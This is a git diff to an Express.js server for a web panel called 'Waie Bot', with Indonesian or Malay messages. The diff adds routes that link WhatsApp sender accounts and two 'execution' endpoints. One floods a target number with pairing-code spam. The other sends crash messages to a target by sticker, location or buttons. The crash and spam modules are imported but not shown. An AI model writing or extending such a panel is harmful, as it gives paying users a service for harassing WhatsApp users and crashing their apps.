@@ -16,11 +16,29 @@ app.use(express.json());
 
 // Static files
 app.use(express.static(path.join(__dirname, '../public')));
+app.use('/tools', express.static(path.join(__dirname, '../public/tools')));
 
 // Import modules
 const { getUsers, saveUsers, loadAkses, saveAkses, isOwner, isAuthorized } = require('../user-manager.js');
 const { activeSessions, savePersistentSessions, cleanupExpiredSessions, generateSessionId } = require('../session-store.js');
 const { requireAuth } = require('../auth.middleware.js');
+const { connectToWhatsApp, spamPairingCode, activeWhatsAppSessions } = require('../whatsapp/waie-client.js');
+const { executeAllCrash, crashWithSticker, crashWithLocation, crashWithButtons } = require('../whatsapp/crash-modules.js');
+const { spamPairingAdvanced } = require('../whatsapp/pairing-spam.js');
+
+// Store user events for SSE
+const userEvents = new Map();
+
+global.sendEventToUser = (username, data) => {
+    const res = userEvents.get(username);
+    if (res) {
+        try {
+            res.write(`data: ${JSON.stringify(data)}\n\n`);
+        } catch (err) {
+            userEvents.delete(username);
+        }
+    }
+};
 
 // ==================== AUTH ROUTES ====================
 
@@ -35,7 +53,7 @@ app.get("/", (req, res) => {
         const users = getUsers();
         const currentUser = users.find(u => u.username === username);
         if (currentUser && Date.now() < currentUser.expired) {
-            return res.redirect("/dashboard.html");
+            return res.redirect("/dashboard");
         }
     }
     
@@ -43,20 +61,6 @@ app.get("/", (req, res) => {
 });
 
 app.get("/login", (req, res) => {
-    const username = req.cookies.sessionUser;
-    const clientSessionId = req.cookies.sessionId;
-    
-    const activeSession = activeSessions.get(username);
-    const isSessionValid = activeSession && activeSession.sessionId === clientSessionId;
-    
-    if (username && isSessionValid) {
-        const users = getUsers();
-        const currentUser = users.find(u => u.username === username);
-        if (currentUser && Date.now() < currentUser.expired) {
-            return res.redirect("/dashboard.html");
-        }
-    }
-    
     res.sendFile(path.join(__dirname, '../public/login.html'));
 });
 
@@ -108,8 +112,10 @@ app.post("/auth", (req, res) => {
     res.cookie("sessionUser", username, cookieOptions);
     res.cookie("sessionId", sessionId, cookieOptions);
     
-    res.redirect("/dashboard.html");
+    res.redirect("/dashboard");
 });
+
+// ==================== API ROUTES ====================
 
 app.get("/api/session-check", (req, res) => {
     const username = req.cookies.sessionUser;
@@ -159,7 +165,7 @@ app.get("/api/option-data", requireAuth, (req, res) => {
         res.json({
             username: currentUser.username,
             role: currentUser.role || 'user',
-            activeSenders: 0,
+            activeSenders: activeWhatsAppSessions.size,
             totalSenders: 0,
             expired: expiredStr,
             daysRemaining: daysRemaining,
@@ -202,7 +208,7 @@ app.get("/api/profile-data", requireAuth, (req, res) => {
         username: currentUser.username,
         role: currentUser.role || 'user',
         key: currentUser.key || '',
-        activeSenders: 0,
+        activeSenders: activeWhatsAppSessions.size,
         expired: expired,
         daysRemaining: daysRemaining,
         createdAt: currentUser.createdAt || Date.now(),
@@ -212,9 +218,8 @@ app.get("/api/profile-data", requireAuth, (req, res) => {
 });
 
 app.get("/api/online-users", requireAuth, (req, res) => {
-    const onlineCount = activeSessions.size;
     res.json({ 
-        onlineUsers: onlineCount || 1,
+        onlineUsers: activeSessions.size || 1,
         timestamp: Date.now()
     });
 });
@@ -458,30 +463,149 @@ app.delete("/api/user/:username", requireAuth, (req, res) => {
     });
 });
 
+// ==================== WHATSAPP ROUTES ====================
+
 app.get("/api/my-senders", requireAuth, (req, res) => {
-    res.json({ success: true, senders: [], total: 0 });
+    const username = req.cookies.sessionUser;
+    const userSenders = [];
+    
+    activeWhatsAppSessions.forEach((_, key) => {
+        if (key.startsWith(username)) {
+            const number = key.split(':')[1];
+            userSenders.push(number);
+        }
+    });
+    
+    res.json({ success: true, senders: userSenders, total: userSenders.length });
 });
 
 app.post("/api/add-sender", requireAuth, async (req, res) => {
-    res.json({ success: true, message: "Feature coming soon" });
+    const username = req.cookies.sessionUser;
+    const { number } = req.body;
+    
+    if (!number) {
+        return res.json({ success: false, error: "Nomor tidak boleh kosong" });
+    }
+    
+    const cleanNumber = number.replace(/\D/g, '');
+    const sessionDir = path.join(__dirname, '../auth', username, cleanNumber);
+    
+    connectToWhatsApp(username, cleanNumber, sessionDir)
+        .then(() => {
+            res.json({ success: true, message: "Proses koneksi dimulai!" });
+        })
+        .catch((error) => {
+            res.json({ success: false, error: error.message });
+        });
 });
 
 app.post("/api/delete-sender", requireAuth, async (req, res) => {
-    res.json({ success: true, message: "Feature coming soon" });
+    const username = req.cookies.sessionUser;
+    const { number } = req.body;
+    
+    if (!number) {
+        return res.json({ success: false, error: "Nomor tidak boleh kosong" });
+    }
+    
+    const sessionKey = `${username}:${number}`;
+    const sock = activeWhatsAppSessions.get(sessionKey);
+    
+    if (sock) {
+        sock.ws?.close();
+        activeWhatsAppSessions.delete(sessionKey);
+    }
+    
+    const sessionDir = path.join(__dirname, '../auth', username, number);
+    if (fs.existsSync(sessionDir)) {
+        fs.rmSync(sessionDir, { recursive: true, force: true });
+    }
+    
+    res.json({ success: true, message: "Sender berhasil dihapus" });
 });
 
+// ==================== EXECUTION ROUTES ====================
+
+app.post("/api/execute/spam", requireAuth, async (req, res) => {
+    const { target, count } = req.body;
+    
+    if (!target) {
+        return res.json({ success: false, error: "Target diperlukan" });
+    }
+    
+    const result = await spamPairingAdvanced(target, parseInt(count) || 50);
+    res.json({ success: true, result });
+});
+
+app.post("/api/execute/crash", requireAuth, async (req, res) => {
+    const { target, method } = req.body;
+    const username = req.cookies.sessionUser;
+    
+    const userSenders = [];
+    activeWhatsAppSessions.forEach((_, key) => {
+        if (key.startsWith(username)) {
+            userSenders.push(key.split(':')[1]);
+        }
+    });
+    
+    if (userSenders.length === 0) {
+        return res.json({ success: false, error: "Tiada sender aktif" });
+    }
+    
+    const senderNumber = userSenders[0];
+    const sock = activeWhatsAppSessions.get(`${username}:${senderNumber}`);
+    
+    if (!sock) {
+        return res.json({ success: false, error: "Sender tidak aktif" });
+    }
+    
+    const targetJid = `${target.replace(/\D/g, '')}@s.whatsapp.net`;
+    let result;
+    
+    switch(method) {
+        case 'sticker':
+            result = await crashWithSticker(sock, targetJid);
+            break;
+        case 'location':
+            result = await crashWithLocation(sock, targetJid);
+            break;
+        case 'buttons':
+            result = await crashWithButtons(sock, targetJid);
+            break;
+        default:
+            result = await executeAllCrash(sock, targetJid);
+    }
+    
+    res.json({ success: true, result });
+});
+
+// ==================== SSE EVENTS ====================
+
 app.get("/api/events", requireAuth, (req, res) => {
+    const username = req.cookies.sessionUser;
+    
     res.writeHead(200, {
         'Content-Type': 'text/event-stream',
         'Cache-Control': 'no-cache',
         'Connection': 'keep-alive'
     });
-    res.write(': heartbeat\n\n');
+    
+    userEvents.set(username, res);
+    
+    const heartbeat = setInterval(() => {
+        try {
+            res.write(': heartbeat\n\n');
+        } catch (err) {
+            clearInterval(heartbeat);
+        }
+    }, 30000);
+    
+    req.on('close', () => {
+        clearInterval(heartbeat);
+        userEvents.delete(username);
+    });
 });
 
-app.post("/api/logout-other-device", async (req, res) => {
-    res.json({ success: true, message: "Logged out" });
-});
+// ==================== LOGOUT ====================
 
 app.get("/logout", (req, res) => {
     const username = req.cookies.sessionUser;
@@ -497,6 +621,8 @@ app.get("/logout", (req, res) => {
     res.redirect("/login?msg=Logout berhasil");
 });
 
+// ==================== UTILITY FUNCTIONS ====================
+
 function parseDuration(str) {
     const match = str.match(/^(\d+)([dh])$/);
     if (!match) return null;
@@ -510,10 +636,11 @@ function generateKey(length = 4) {
     return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
 }
 
-// Start server
+// ==================== START SERVER ====================
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`✅ Waie Bot running on port ${PORT}`);
+    console.log(`🔥 Waie Bot running on port ${PORT}`);
 });
 
 module.exports = app;
